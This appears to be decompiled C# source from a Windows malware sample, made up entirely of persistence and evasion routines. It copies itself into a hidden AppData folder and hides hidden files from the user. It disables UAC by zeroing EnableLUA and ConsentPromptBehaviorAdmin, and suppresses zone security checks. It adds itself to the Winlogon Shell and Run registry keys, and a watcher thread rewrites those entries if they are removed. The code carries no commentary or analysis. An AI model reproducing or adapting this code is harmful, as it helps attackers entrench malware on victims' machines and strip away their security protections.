using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal sealed class Class26
{
	private static GClass1 gclass1_0;

	private static GClass1 gclass1_1;

	public void method_0()
	{
		method_2();
		method_3();
		method_1();
		new Thread(method_4).Start();
	}

	private void method_1()
	{
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string executablePath = Application.get_ExecutablePath();
			if (!Directory.Exists(folderPath + "\\" + Class11.string_5))
			{
				DirectoryInfo directoryInfo = Directory.CreateDirectory(folderPath + "\\" + Class11.string_5);
				directoryInfo.Attributes = FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory;
			}
			if (!File.Exists(folderPath + "\\" + Class11.string_5 + "\\" + Class11.string_4))
			{
				File.Copy(executablePath, folderPath + "\\" + Class11.string_5 + "\\" + Class11.string_4);
				FileInfo fileInfo = new FileInfo(folderPath + "\\" + Class11.string_5 + "\\" + Class11.string_4);
				smethod_1(folderPath + "\\" + Class11.string_5, Class11.string_4);
				fileInfo.Attributes = FileAttributes.ReadOnly | FileAttributes.Hidden;
				Process.Start(folderPath + "\\" + Class11.string_5 + "\\" + Class11.string_4);
				Environment.Exit(0);
			}
		}
		catch
		{
		}
	}

	public static void smethod_0()
	{
		try
		{
			gclass1_0.method_10();
			gclass1_1.method_10();
			RegistryKey registryKey = ((!Class29.smethod_3()) ? Registry.CurrentUser : Registry.LocalMachine);
			registryKey.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class11.string_6, string.Empty);
			string name = "Shell";
			string value = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Class11.string_5 + "\\" + Class11.string_4;
			RegistryKey registryKey2 = ((!Class29.smethod_3()) ? Registry.CurrentUser : Registry.LocalMachine);
			using (registryKey2 = registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true))
			{
				if (registryKey2.GetValue(name) == null)
				{
					registryKey2.SetValue(name, "explorer.exe");
				}
				else
				{
					string text = registryKey2.GetValue(name)!.ToString();
					if (!text.Contains(value))
					{
						registryKey2.SetValue(name, text);
					}
				}
			}
			Environment.Exit(0);
		}
		catch
		{
		}
	}

	public static void smethod_1(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd";
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			process.StartInfo = processStartInfo;
			process.Start();
			StreamWriter standardInput = process.StandardInput;
			standardInput.WriteLine("cd " + string_0);
			standardInput.WriteLine("echo [zoneTransfer]ZoneID = 2 > " + string_1 + ":ZONE.identifier");
			standardInput.WriteLine("exit");
			standardInput.Close();
		}
		catch
		{
		}
	}

	private void method_2()
	{
		try
		{
			Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
			RegistryKey registryKey = ((!Class29.smethod_3()) ? Registry.CurrentUser : Registry.LocalMachine);
			registryKey = registryKey.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey != null && registryKey.GetValue("EnableLUA") != null)
			{
				registryKey.SetValue("EnableLUA", "0");
			}
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey2 != null && registryKey2.GetValue("ConsentPromptBehaviorAdmin") != null)
			{
				registryKey2.SetValue("ConsentPromptBehaviorAdmin", "0");
			}
			RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
			if (registryKey3 != null && registryKey3.GetValue("Hidden") != null)
			{
				registryKey3.SetValue("Hidden", "2");
			}
		}
		catch
		{
		}
	}

	private void method_3()
	{
		try
		{
			string name = "Shell";
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Class11.string_5 + "\\" + Class11.string_4;
			RegistryKey registryKey = ((!Class29.smethod_3()) ? Registry.CurrentUser : Registry.LocalMachine);
			using (registryKey = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true))
			{
				if (registryKey.GetValue(name) == null)
				{
					registryKey.SetValue(name, "explorer.exe," + text);
				}
				else
				{
					string text2 = registryKey.GetValue(name)!.ToString();
					if (!text2.Contains(text))
					{
						registryKey.SetValue(name, text2 + text);
					}
				}
			}
			RegistryKey registryKey3 = ((!Class29.smethod_3()) ? Registry.CurrentUser : Registry.LocalMachine);
			registryKey3.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Class11.string_6, text);
		}
		catch
		{
		}
	}

	private void method_4()
	{
		try
		{
			List<string> list = new List<string>();
			if (Class29.smethod_3())
			{
				list.Add(Registry.LocalMachine.Name + "\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				list.Add(Registry.LocalMachine.Name + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
			}
			else
			{
				list.Add(Registry.CurrentUser.Name + "\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				list.Add(Registry.CurrentUser.Name + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
			}
			gclass1_0 = new GClass1(list[0]);
			gclass1_1 = new GClass1(list[1]);
			gclass1_0.method_0(method_5);
			gclass1_1.method_0(method_5);
			gclass1_0.method_9();
			gclass1_1.method_9();
		}
		catch
		{
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		method_3();
	}
}
